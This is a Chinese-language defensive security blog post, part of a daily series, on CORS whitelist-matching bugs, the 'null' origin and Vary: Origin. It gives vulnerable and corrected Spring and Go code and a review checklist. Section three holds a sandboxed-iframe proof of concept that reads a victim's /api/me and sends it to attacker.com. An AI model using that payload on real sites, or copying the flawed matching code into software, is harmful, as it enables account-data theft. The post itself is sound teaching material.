---
title: "Day 58：CORS 設定踩雷（延伸篇）— 反射 Origin、白名單比對 bug 與 `null` origin（當「跨域放行」變成「全世界都能帶著你的 cookie 來」）"
date: 2026-06-22
tags: ["CORS", "瀏覽器安全", "Java", "Go"]
---

# Day 58：CORS 設定踩雷（延伸篇）— 反射 Origin、白名單比對 bug 與 `null` origin

接續 Day57 預告：昨天 JWT 是「token 自身的驗證」被繞過，問題在伺服器沒真正驗章；今天看瀏覽器同源政策的另一面——CORS。

**這篇不是重新介紹 CORS。** CORS 是什麼、preflight 怎麼運作、六個 security header、`Allow-Origin: *` 配 `Allow-Credentials` 為什麼危險，這些在 Day09 已經講過入門。這篇是**延伸篇**，延伸角度只有一個：**「白名單到底比對對了沒有」**。

實務上幾乎沒人會傻到直接寫 `Access-Control-Allow-Origin: *` 配 credentials——那種錯誤太明顯，linter 跟 code review 一眼就看到。真正會在 production 活很久的 CORS 漏洞，幾乎都是**「我有做白名單，但比對方式寫錯了」**：用 `startsWith`、`endsWith`、`contains`、沒錨定的 regex，或是「先比對、比過就把請求的 Origin 反射回去」。這篇就專門拆這幾種「看起來有防、其實沒防」的實作 bug，以及 `null` origin 與 `Vary: Origin` 快取污染這兩個容易漏掉的角落，最後給一份 code review / 測試的偵測清單。

---

## 一、先把唯一一條規則講清楚（不是入門，是定位）

帶 credentials 的 CORS，瀏覽器只認**一個**精確的 Origin 字串：

```http
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Credentials: true
```

- `Allow-Origin` 這裡**不能**是 `*`（瀏覽器會直接拒絕帶 cookie 的回應）。
- 所以後端常見的「解法」是：拿請求的 `Origin` header，**判斷它在不在白名單**，在的話就把這個 Origin 原封不動寫回 `Allow-Origin`。

漏洞就誕生在這個「判斷在不在白名單」的實作裡。攻擊者能控制的就是請求的 `Origin` header（他的惡意網站發 fetch 時，瀏覽器會自動帶上他的 origin）。只要他能讓你的比對邏輯**誤判**他的 origin「在白名單內」，你就會把 `Access-Control-Allow-Origin: https://attacker.com` + `Allow-Credentials: true` 寫回去——等於告訴瀏覽器「允許 attacker.com 帶著受害者的 cookie 讀我的回應」。後果是攻擊者的頁面可以用受害者身分讀取 `/api/me`、`/api/account` 等任何端點的內容。

下面看比對邏輯能寫錯到什麼程度。

---

## 二、白名單比對的五種經典寫錯

假設你的合法前端是 `https://app.example.com`。

### 2-1 `startsWith`（前綴比對）

```text
origin.startsWith("https://app.example.com")
```

攻擊者註冊 `https://app.example.com.attacker.com`：

```text
"https://app.example.com.attacker.com".startsWith("https://app.example.com") → true ❌
```

通過。攻擊者的網域以你的網域為前綴，輕鬆繞過。

### 2-2 `endsWith`（後綴比對，想做「子網域都放行」）

```text
origin.endsWith(".example.com")  // 或 endsWith("example.com")
```

兩個問題：

```text
"https://app.example.com.attacker.com".endsWith("example.com")  → 還好，false
"https://evilexample.com".endsWith("example.com")              → true ❌（少了點，連 evil 都中）
"https://attacker.com/.example.com" 之類繞法 / 攻擊者註冊 example.com 的兄弟網域
```

更常見的災難是 `endsWith(".example.com")` 但攻擊者拿到了**某個能放任意內容的子網域**（subdomain takeover、或是 `userpages.example.com` 這種使用者可控子網域）——這就接回 Day35 子網域接管的風險：你「信任所有子網域」，但其中一個子網域被攻擊者控制了，CORS 信任鏈就斷在那裡。

### 2-3 `contains` / `indexOf`（子字串比對）

```text
origin.contains("example.com")
```

最糟的一種：

```text
"https://example.com.attacker.com" → 含 → true ❌
"https://attacker.com?x=example.com" → 含 → true ❌
```

幾乎等於沒比對。

### 2-4 沒錨定的正規表示式

```text
Pattern: ^https://.*\.example\.com$        // 看起來有錨定
```

`.` 在 regex 是「任意字元」，沒跳脫的話：

```text
^https://.*\.example\.com$
            ↑ 這個 . 沒問題（有跳脫成 \.）
但 .* 太貪婪：https://app.example.com.attacker.com 不會中（有 $ 錨）
```

真正的坑是**忘了錨定或錨定錯**：

```text
Pattern: https://app\.example\.com     // 沒有 ^ 和 $
"https://app.example.com.attacker.com" → 部分匹配 → 在多數 regex 引擎的「find/search」語意下回傳 true ❌
```

關鍵：很多語言的 regex API 預設是「**部分匹配（search）**」而不是「**全字串匹配（match）**」。沒有 `^...$`（或用 `matches()` 而非 `find()`），`app.example.com` 只要出現在字串任何位置就算中。

### 2-5 大小寫 / 結尾斜線 / port 處理不一致

```text
"https://APP.example.com"   // 大小寫
"https://app.example.com:443" // 顯式 port
"https://app.example.com/"  // 多一個斜線（正常 Origin 不帶 path，但防禦性要考慮）
```

比對時若用 `equalsIgnoreCase` 反而可能放寬，用 `equals` 又可能擋到自己——重點是**正規化（normalize）後再做精確比對**，而不是邊比對邊容錯。

---

## 三、`null` origin：一個被很多白名單「順手加進去」的後門

開發時為了讓 `file://`、sandboxed iframe、某些 redirect 情境能動，工程師常把 `"null"` 加進白名單：

```text
allowedOrigins = ["https://app.example.com", "null"]   // ❌ 危險
```

問題是攻擊者**可以主動製造 `Origin: null`**。最常見的手法是用 sandboxed iframe：

```html
<!-- 攻擊者頁面 -->
<iframe sandbox="allow-scripts allow-forms"
        srcdoc="<script>
          fetch('https://victim.example.com/api/me', {credentials:'include'})
            .then(r => r.text())
            .then(d => fetch('https://attacker.com/log?d='+encodeURIComponent(d)));
        </script>">
</iframe>
```

`sandbox` 屬性（不含 `allow-same-origin`）會讓裡面的請求帶 `Origin: null`。你的白名單放行了 `null`，等於對「任何能塞 sandboxed iframe 的攻擊者」開門。

**結論：永遠不要把 `null` 放進 CORS 白名單。** 需要支援 `file://` 的桌面/本機情境，請另尋方案（例如本機專用的非 credentialed 端點），不要靠 `null` origin。

---

## 四、反射 Origin 一定要記得 `Vary: Origin`（否則快取會幫攻擊者外送）

就算你的白名單比對寫對了，只要你是「**動態反射**」（根據請求 Origin 回不同的 `Access-Control-Allow-Origin`），就一定要加：

```http
Vary: Origin
```

理由：`Access-Control-Allow-Origin` 的值會隨請求的 `Origin` 變化。如果中間有快取（CDN、反向代理、瀏覽器快取）而你**沒**告訴它「這個回應會因 Origin 不同而不同」，快取就可能把「給 A origin 的回應」（含 `Allow-Origin: https://a.example.com`）拿去回給 B origin 的請求，或反之。

更糟的組合是**快取污染**：某些設定下，攻擊者先用自己的 origin 打一個會被快取的端點，若回應被錯誤快取且 key 沒包含 Origin，後續使用者可能拿到帶有攻擊者 origin 的 `Allow-Origin`，或 CORS 行為被攪亂（這也呼應 Day30 Web Cache Poisoning：unkeyed 的輸入污染了共用快取）。

一句話：**動態反射 Origin → 必加 `Vary: Origin`，且確認 CDN/proxy 的 cache key 有把 Origin 算進去。**

---

## 五、Java（Spring）：反射 Origin 的反例 vs. 精確白名單

> 環境：Spring Framework 6 / Spring Boot 3，`org.springframework.web.cors.CorsConfiguration`。以下用的是 Spring 官方的 `CorsConfiguration` API（`setAllowedOrigins` / `setAllowedOriginPatterns` / `setAllowCredentials`），皆為現行穩定 API。

### 反例一：自己反射 Origin（最常見的手寫災難）

```java
// ❌ 反例：在 Filter / Interceptor 裡手動把請求 Origin 反射回去
String origin = request.getHeader("Origin");
if (origin != null && origin.contains("example.com")) {   // 比對寫法本身就錯（見第二節）
    response.setHeader("Access-Control-Allow-Origin", origin); // 把不可信輸入直接寫回
    response.setHeader("Access-Control-Allow-Credentials", "true");
}
```

這段同時踩了「比對用 contains」+「直接反射」+「沒有 Vary」三個雷。

### 反例二：以為 `allowCredentials(true)` 配 `*` 可以用

```java
CorsConfiguration cfg = new CorsConfiguration();
cfg.addAllowedOrigin("*");          // ❌
cfg.setAllowCredentials(true);      // 與上面衝突
```

Spring 在這種組合下會在啟動或處理時報錯/拒絕（因為瀏覽器規格本就不允許 `*` 配 credentials），逼你正視問題——但很多人此時的「修法」是改成手寫反射（變成反例一），等於把編譯期/啟動期的保護換成 runtime 漏洞。

### 正解：用 `setAllowedOrigins` 給精確清單（讓框架處理比對與 Vary）

```java
import org.springframework.web.cors.CorsConfiguration;
import org.springframework.web.cors.UrlBasedCorsConfigurationSource;
import org.springframework.web.cors.CorsConfigurationSource;
import java.util.List;

@Bean
public CorsConfigurationSource corsConfigurationSource() {
    CorsConfiguration cfg = new CorsConfiguration();

    // ✅ 精確、完整的 origin（含 scheme，必要時含 port），由框架做精確比對
    cfg.setAllowedOrigins(List.of(
            "https://app.example.com",
            "https://admin.example.com"
    ));
    cfg.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE"));
    cfg.setAllowedHeaders(List.of("Authorization", "Content-Type"));
    cfg.setAllowCredentials(true);
    cfg.setMaxAge(3600L); // preflight 快取秒數

    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration("/api/**", cfg);
    return source;
}
```

兩個延伸重點（這才是延伸篇要強調的，不是入門那套）：

1. **用 `setAllowedOrigins`（精確清單）而不是自己反射。** 框架會自己比對、自己把通過的那個 origin 寫回 `Allow-Origin`，並自動加上 `Vary: Origin`。你不該在 Filter 裡手寫這段。
2. **`setAllowedOriginPatterns` 要非常小心。** Spring 提供 `setAllowedOriginPatterns(...)` 讓你寫 `https://*.example.com` 這類模式（這是為了能配 credentials 又支援萬用子網域而設計的）。它**只允許一層萬用比對**、不是任意 regex，但它仍然意味著「我信任所有子網域」——一旦任一子網域被接管（Day35），這條信任就破。能列舉就列舉，不得已才用 pattern，且務必盤點所有子網域的控制權。

```java
// ⚠️ 僅在真的需要「所有子網域」時使用，且要清楚這代表信任每一個子網域
cfg.setAllowedOriginPatterns(List.of("https://*.example.com"));
cfg.setAllowCredentials(true);
```

---

## 六、Go：`net/http` middleware 的精確比對 vs. 後綴比對 bug

> 環境：Go 1.21+，標準庫 `net/http`。不依賴第三方套件，純手寫 middleware 示範比對邏輯。

### 反例：用 `strings.HasSuffix` 想放行子網域

```go
// ❌ 反例：後綴比對 + 直接反射
func corsBad(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        origin := r.Header.Get("Origin")
        if strings.HasSuffix(origin, "example.com") { // "https://evilexample.com" 也中
            w.Header().Set("Access-Control-Allow-Origin", origin) // 反射不可信輸入
            w.Header().Set("Access-Control-Allow-Credentials", "true")
        }
        next.ServeHTTP(w, r)
    })
}
```

`HasSuffix(origin, "example.com")` 會放行 `https://evilexample.com`、`https://attackerexample.com`。即使改成 `HasSuffix(origin, ".example.com")`，也只是退回「信任所有子網域」的風險，且仍是直接反射。

### 正解：精確集合比對 + 只反射「白名單裡的那個值」+ `Vary: Origin`

```go
package main

import (
	"net/http"
)

// ✅ 精確、完整的 origin 字串集合
var allowedOrigins = map[string]struct{}{
	"https://app.example.com":   {},
	"https://admin.example.com": {},
}

func cors(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		origin := r.Header.Get("Origin")

		// 動態反射 → 一定要加 Vary: Origin，避免快取錯置
		w.Header().Add("Vary", "Origin")

		if _, ok := allowedOrigins[origin]; ok {
			// 只反射「確定在白名單裡」的那個值（其實等同回寫常數）
			w.Header().Set("Access-Control-Allow-Origin", origin)
			w.Header().Set("Access-Control-Allow-Credentials", "true")
			w.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE")
			w.Header().Set("Access-Control-Allow-Headers", "Authorization, Content-Type")
			w.Header().Set("Access-Control-Max-Age", "3600")
		}
		// 不在白名單：不設任何 CORS header，瀏覽器自然會擋下跨域讀取

		// preflight 直接回 204
		if r.Method == http.MethodOptions {
			w.WriteHeader(http.StatusNoContent)
			return
		}
		next.ServeHTTP(w, r)
	})
}
```

四個延伸重點：

1. **用 `map` 做集合精確比對**，不要用 `HasPrefix` / `HasSuffix` / `Contains`。
2. **只把「比對通過的那個值」寫回**——本質上等於回寫白名單中的常數，不是回寫「請求帶來的任意 origin」。
3. **`Vary: Origin` 用 `Add` 不是 `Set`**，避免覆蓋掉其他既有的 Vary 值（例如 `Accept-Encoding`）。
4. **不要把 `"null"` 放進 `allowedOrigins`**（見第三節）。

---

## 七、常見防禦誤區（延伸篇重點）

1. **「我有做白名單」≠「我的比對是對的」**：八成的 CORS 漏洞不是沒白名單，而是用了 `startsWith`/`endsWith`/`contains`/沒錨定 regex。
2. **「動態反射 Origin」本身不是錯，但只能反射『白名單裡那個值』**：反射「請求帶來的任意值」才是漏洞。心法：先比對，比過之後寫回的東西其實是白名單裡的常數。
3. **CORS 不能擋 CSRF**：CORS 控制的是「能不能**讀取**跨域回應」，不是「能不能**送出**請求」。簡單請求（GET、表單型 POST）就算沒通過 CORS 也會被送到後端、副作用照樣發生——別把 CORS 當 CSRF 防禦（CSRF 請回 Day03：SameSite + CSRF token）。
4. **preflight 不帶身分**：OPTIONS 不會帶 cookie/Authorization（按設計），別把鑑權塞在 OPTIONS 上，實際鑑權放在 GET/POST/PUT/DELETE。
5. **`localhost` / staging origin 殘留在 production 白名單**：開發方便加的 `http://localhost:3000`、`https://staging.example.com` 忘了拿掉，等於留後門。用環境變數分環境注入白名單。
6. **只在 nginx 設、框架又設一次**：兩邊不一致會出現 `Access-Control-Allow-Origin` 重複，瀏覽器反而報錯——CORS 只在一個地方設定。

---

## 八、後端工程師的偵測 / Code Review Checklist

- [ ] 全 codebase 搜尋 `Access-Control-Allow-Origin`、`AllowedOrigins`、`setAllowedOrigin`，逐一確認比對方式。
- [ ] 比對是否為**精確集合比對**？看到 `startsWith`/`endsWith`/`contains`/`indexOf`/`HasPrefix`/`HasSuffix` 出現在 origin 判斷就是紅旗。
- [ ] regex 比對是否有 `^...$` 錨定、`.` 是否都跳脫成 `\.`、用的是 `matches()`（全匹配）而非 `find()`（部分匹配）？
- [ ] 白名單裡是否誤含 `"null"`、`"*"`、`localhost`、staging URL？
- [ ] 是否把「請求帶來的任意 Origin」直接反射回 `Allow-Origin`，而不是回寫白名單裡的值？
- [ ] 動態反射時是否有 `Vary: Origin`，且 CDN/proxy 的 cache key 有含 Origin？
- [ ] `Allow-Credentials: true` 是否確實只配精確 origin，而非 `*`？
- [ ] 是否用 `*.example.com` 這類 pattern？若有，是否盤點過所有子網域控制權（防 Day35 子網域接管）？
- [ ] 測試：用 `curl -H "Origin: https://app.example.com.attacker.com"`、`-H "Origin: https://evilexample.com"`、`-H "Origin: null"` 打 API，檢查回應的 `Access-Control-Allow-Origin` 是否被放行。

```bash
# 快速手測：看危險 origin 會不會被反射放行
curl -s -I -H "Origin: https://app.example.com.attacker.com" \
     https://api.example.com/api/me | grep -i "access-control-allow-origin"
# 預期：沒有這個 header（被擋）。若回 https://app.example.com.attacker.com → 有洞
```

---

## 九、一句話總結

> **CORS 漏洞八成不是「忘了設白名單」，而是「白名單比對寫錯」。** 守住三件事：精確集合比對（不要 startsWith/endsWith/contains/沒錨定 regex）、只反射白名單裡的值（加 `Vary: Origin`）、永遠不放 `null` 與 `*` 配 credentials。任何一處偷懶，攻擊者就能帶著受害者的 cookie 來讀你的 API。

---

## 延伸閱讀

- PortSwigger Web Security Academy — CORS vulnerabilities（origin reflection、null origin、trusted subdomain）
- MDN — Cross-Origin Resource Sharing (CORS)、`Vary`
- OWASP — HTML5 Security Cheat Sheet（CORS 部分）
- Spring Framework 官方文件 — `CorsConfiguration`（`setAllowedOrigins` / `setAllowedOriginPatterns` / `setAllowCredentials`）
- 前文：Day09 Security Headers / CORS（入門）、Day35 子網域接管、Day30 Web Cache Poisoning、Day03 CSRF

---

明天預告：**Day 59 — CSV / Formula Injection（公式注入）：當「匯出報表」變成「使用者一打開 Excel 就執行攻擊者的指令」**
（全新主題，系列尚未介紹過。後端常把使用者輸入的資料匯出成 CSV/XLSX 給人下載，若某欄位以 `=`、`+`、`-`、`@` 開頭，Excel/Google Sheets 開檔時會把它當公式執行——輕則 `=HYPERLINK` 釣魚、`=cmd|...` 觸發 DDE，重則外洩同份試算表的其他資料。會用 Java（Apache POI / 手寫 CSV writer 的逸出處理）與 Go（`encoding/csv` 寫出時的欄位前綴防禦）示範匯出端如何正確逸出，並談為什麼「輸入時擋」跟「輸出時逸出」要分開看。）
